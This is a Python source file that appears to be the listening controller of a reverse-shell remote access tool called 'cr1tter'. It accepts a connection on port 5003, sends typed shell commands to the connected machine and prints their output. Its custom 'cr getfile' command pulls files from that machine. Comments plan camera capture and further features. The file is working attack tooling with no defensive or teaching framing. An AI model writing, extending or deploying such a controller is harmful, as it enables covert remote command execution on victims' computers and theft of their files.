import os
import socket
from tqdm import tqdm

#TODO
# Handle multiple connections, pick and choose which
# Custum commands
#   Camera
#   download files
#   ...

#Server vars
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

#Formating
def Setup():
    size = os.get_terminal_size()
    MESSAGE = "cr1tter"

    if(os.name == "posix"):
        os.system("clear")
    elif (os.name == "nt"):
        os.system("cls")

    print("=" * size.columns + "\n" +
          "=" * round(size.columns/2 - len(MESSAGE)/2) + MESSAGE + "=" * round(size.columns/2 - len(MESSAGE)/2) + "\n" +
          "=" * size.columns + "\n\n")

def cr_GetFile(filename: str, filesize: int):
    progress = tqdm(range(filesize), desc=f"Reciving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        total_bytes = 0
        while total_bytes < filesize:
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:
                break
            f.write(bytes_read)
            total_bytes += len(bytes_read)
            progress.update(len(bytes_read))


Setup()
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected! \n")

cwd = client_socket.recv(BUFFER_SIZE).decode()


while True:
    # get the command from prompt
    command = input(f"{cwd} & ")
    splited_command = command.split()
    if not command.strip():
        # empty command
        continue

    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        print("Closing server..." + "\n" +
              "Bye")
        break
    elif splited_command[0].lower() == "cr":
        if splited_command[1].lower() == "getfile":
            output = client_socket.recv(BUFFER_SIZE).decode()
            filename, filesize = output.split(SEPARATOR)
            cr_GetFile(os.path.basename(filename), int(filesize))
    else:
        # retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        # split command output and current directory
        results, cwd = output.split(SEPARATOR)
        # print output
        print(results)

